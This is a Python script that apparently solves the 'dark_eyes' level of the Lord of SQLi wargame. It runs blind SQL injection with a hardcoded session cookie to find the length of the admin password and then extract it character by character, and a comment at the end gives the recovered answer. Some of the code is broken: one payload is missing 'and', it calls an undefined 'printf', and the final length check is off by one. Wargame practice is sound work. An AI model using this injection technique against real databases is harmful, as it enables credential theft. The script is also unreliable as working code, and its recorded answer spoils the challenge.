from requests import Session, request

URL = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
session = {"PHPSESSID": "c8o4nup8pn2fn76vsh9mlrmrni"}

PWLength = 0
FLAG = ""


def lengthPW():
    global PWLength
    for i in range(1, 99):

        payload = f"?pw=' or id='admin' and (select 1 union select length(pw)={i})%23"
        """
        ?pw=1%20%27%20or%20id=%27admin%27%20and%20(select%201%20union%20select%20length(pw)=8)%23
        """
        res = request(method='GET', url=URL + payload, cookies=session)
        # print(f"[*] in progress {i}")

        if "query :" in res.text:
            print("PW length is ::", i)
            PWLength = i
            break


def getPW():
    global PWLength
    global FLAG

    for i in range(1, PWLength + 1):
        for j in range(48, 128):
            # print(i, j)
            payload = f"?pw=' or id='admin' (select 1 union select substr(pw,{i},1)='{chr(j)}')%23"
            res = request(method='GET', url=URL + payload, cookies=session)

            if "prob_dark_eyes" in res.text:
                print(f"PW[{str(i)}] is :: {chr(j)}")
                FLAG = FLAG + chr(j)
            else:
                print(f"[*] continue {i}, {j}/{chr(j)}")

    print(f"PW :: {FLAG}")
    printf(len(FLAG) == PWLength + 1)


if __name__ == '__main__':
    lengthPW()
    getPW()  # 06b5a6c16e8830475f983cc3a825ee9a
